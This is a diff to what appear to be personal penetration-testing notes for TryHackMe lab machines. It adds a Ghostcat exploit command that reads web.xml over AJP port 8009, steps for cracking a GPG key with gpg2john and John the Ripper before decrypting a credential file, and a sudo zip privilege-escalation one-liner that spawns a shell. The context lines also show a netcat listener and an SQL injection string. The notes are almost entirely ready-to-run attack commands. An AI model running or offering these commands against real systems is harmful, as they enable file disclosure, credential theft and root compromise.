@@ -201,3 +201,24 @@ nc -lvnp 1234
 ' OR 1=1 -- -
 
 
+### port 8009
+https://github.com/00theway/Ghostcat-CNVD-2020-10487
+
+python3 ajpShooter.py http://10.10.112.221 8009 /WEB-INF/web.xml read
+
+
+### file.gpg
+/usr/sbin/gpg2john tryhackme.asc > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+gpg --import tryhackme.asc  
+gpg --decrypt credential.pgp
+
+
+### Privilege Escalation Using Zip
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+
+
+
+
+
